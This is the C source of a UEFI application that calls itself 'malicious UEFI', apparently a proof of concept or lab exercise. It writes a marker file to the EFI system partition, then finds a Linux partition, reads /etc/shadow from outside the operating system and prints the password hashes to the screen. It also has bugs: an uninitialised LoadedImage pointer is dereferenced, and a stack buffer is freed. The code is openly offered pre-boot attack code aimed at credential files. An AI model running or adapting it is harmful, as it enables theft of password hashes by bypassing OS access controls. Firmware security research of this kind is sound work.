#include <Uefi.h>
#include <Library/PcdLib.h>
#include <Library/UefiLib.h>
#include <Library/UefiApplicationEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <Guid/GlobalVariable.h>
#include <Guid/FileInfo.h>

#define BUFFER_SIZE 256

EFI_FILE_HANDLE getRoot(CHAR16 *dir, UINTN HandleCount, EFI_HANDLE *Handles){
    EFI_STATUS Status;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_FILE_HANDLE Root;
    for (UINTN i = 0; i < HandleCount; i++) {
        
        Status = gBS->HandleProtocol(Handles[i], &gEfiSimpleFileSystemProtocolGuid, (void**)&FileSystem);
        if (EFI_ERROR(Status)) {
            continue;
        }

        // Open the root directory of the file system
        Status = FileSystem->OpenVolume(FileSystem, &Root);
        if (EFI_ERROR(Status)) {
            continue;
        }

        // Check if the root directory contains a known OS directory (e.g., "Windows" for NTFS)
        EFI_FILE_PROTOCOL *TestFile = NULL;     
        Status = Root->Open(Root, &TestFile, dir, EFI_FILE_MODE_READ, 0);
        if (!EFI_ERROR(Status)) {
            // Found the OS partition, close the test file
            Print(L"OS partition found.\n");
            TestFile->Close(TestFile);
            // return Root;
            break;
        }    

        // Close the root directory if this is not the OS partition
        Root->Close(Root);
        Root = NULL;
    }
    return Root;
}

EFI_STATUS
EFIAPI
UefiMain(
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE  *SystemTable
)
{
    EFI_STATUS Status;
    // EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_LOADED_IMAGE_PROTOCOL       *LoadedImage;
    EFI_HANDLE                      *Handles;


    CHAR16 *FileNameW = L"\\maliciousfile.txt";
    CHAR16 *FileNameR = L"\\etc\\shadow";
    // UINT64 OpenMode = EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE;
    UINT64 OpenModeW = EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE;
    UINT64 OpenModeR = EFI_FILE_MODE_READ;
    UINT64 Attributes = 0;
    
    
    EFI_FILE_HANDLE Root;
    EFI_FILE_HANDLE File;

    CHAR8 Buffer[] = "Hello, I'm malicious UEFI!";
    UINTN BufferSize = sizeof(Buffer);

    // Print system table information
    Print(L"UEFI System Information\n");
    Print(L"========================\n");
    Print(L"Firmware Vendor: %s\n", SystemTable->FirmwareVendor);
    Print(L"Firmware Revision: %x\n", SystemTable->FirmwareRevision);
    SystemTable->BootServices->Stall(5000000);

    UINTN HandleCount = 0;
    Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to locate file system handles: %r\n", Status);
        // FreePool(Buffer);
        SystemTable->BootServices->Stall(5000000);
        return Status;
    }

    Print(L"Image Base Address: %lx\n", LoadedImage->ImageBase);
    Print(L"Image Size: %lx\n", LoadedImage->ImageSize);
    
    Root = getRoot(L"\\EFI", HandleCount, Handles);

    if (Root == NULL) {
        Print(L"OS EFI partition not found.\n");
        FreePool(Buffer);
        FreePool(Handles);
        SystemTable->BootServices->Stall(5000000);
        return EFI_NOT_FOUND;
    }    

    // Open (or create) a file in the root directory
    Status = Root->Open(Root, &File, FileNameW, OpenModeW, Attributes);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to open file: %r\n", Status);
        Root->Close(Root);
        SystemTable->BootServices->Stall(5000000);
        return Status;
    }

    // Write data to the file
    Status = File->Write(File, &BufferSize, Buffer);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to write to file: %r\n", Status);
        SystemTable->BootServices->Stall(5000000);
        File->Close(File);
        return Status;
    }
    Status = File->Close(File);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to close the EFI file: %r\n", Status);
        SystemTable->BootServices->Stall(5000000);
        return Status;
    }
    Status = Root->Close(Root);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to close root file: %r\n", Status);
        SystemTable->BootServices->Stall(5000000);
        return Status;
    }

    CHAR8 BufferR[BUFFER_SIZE];
    CHAR8 *LineBuffer;
    UINTN ReadSize;
    UINTN LineIndex = 0;

    Root = getRoot(L"\\etc", HandleCount, Handles);
    if (Root == NULL) {
        Print(L"OS ext4 partition not found.\n");
        FreePool(Buffer);
        // FreePool(Handles);
        SystemTable->BootServices->Stall(5000000);
        return EFI_NOT_FOUND;
    }

    // Open /etc/shadow file
    Status = Root->Open(Root, &File, FileNameR, OpenModeR, Attributes);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to open file: %r\n", Status);
        Root->Close(Root);
        SystemTable->BootServices->Stall(5000000);
        return Status;
    }
    LineBuffer = AllocateZeroPool(BUFFER_SIZE);
    if (LineBuffer == NULL) {
        Print(L"Failed to allocate memory for line buffer.\n");
        File->Close(File);
        return EFI_OUT_OF_RESOURCES;
    }
    while (TRUE) {
        ReadSize = 1;
        Status = File->Read(File, &ReadSize, BufferR);
        
        if (EFI_ERROR(Status) || ReadSize == 0) {
            break;  // End of file or error
        }

        // if (Buffer[0] == '\n' || LineIndex >= 256 - 1) {
        if (BufferR[0] == '\n' || BufferR[0] == '$' || LineIndex >= 256 - 1) {
            // Null-terminate and print the line
            LineBuffer[LineIndex] = '\0';
            UINTN aux = 0;
            while (LineBuffer[aux] != '\0') {
                Print(L"%c", LineBuffer[aux]);  // Print up to 80 characters at a time
                aux += 1;
            }
            Print(L"\r\n");
            // Print(L"%a\n", LineBuffer);
            LineIndex = 0;  // Reset for next line
        } else {
            // Add character to the line buffer
            LineBuffer[LineIndex++] = BufferR[0];
        }
    }


    // Close the file and root directory
    Status = File->Close(File);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to close the EXT file: %r\n", Status);
        SystemTable->BootServices->Stall(5000000);
        return Status;
    }
    
    Root->Close(Root);
    // FreePool(Buffer);
    FreePool(LineBuffer);

    
    Print(L"File created and data written successfully.\n");

    SystemTable->BootServices->Stall(5000000);

    return EFI_SUCCESS;
}
